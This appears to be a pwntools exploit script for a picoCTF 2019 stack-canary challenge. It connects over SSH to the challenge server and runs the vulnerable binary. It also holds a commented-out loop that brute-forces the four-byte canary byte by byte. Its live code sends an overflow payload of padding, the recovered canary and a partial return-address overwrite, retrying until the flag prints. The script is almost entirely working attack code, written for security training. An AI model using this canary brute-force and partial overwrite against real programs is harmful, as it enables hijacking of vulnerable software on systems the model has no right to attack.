from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")

def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    
    sh = s.process('vuln', cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
    REMOTE = True

# key = ''
# for i in range(4):
#   for c in range(256):
#     start()
#     c = chr(c)
#     sh.sendlineafter('> ', str(33+i))
#     sh.sendlineafter('> ', 'a'*32+key+c)
#     data = sh.recvall()
#     if 'Stack Smashing Detected' not in data:
#       key += c
#       print enhex(key)
#       break
#   else:
#     print 'error'
#     exit()

key = unhex('4c6a6748')

while True:
  start()
  

  sh.sendlineafter('> ', str(32+4+12+6))
  sh.sendlineafter('> ', 'a'*32+key+'a'*(4+12)+'\xed\x07')
  # sh.interactive()
  data = sh.recvall(timeout=0.5)
  if 'pico' in data:
    print data
    exit()

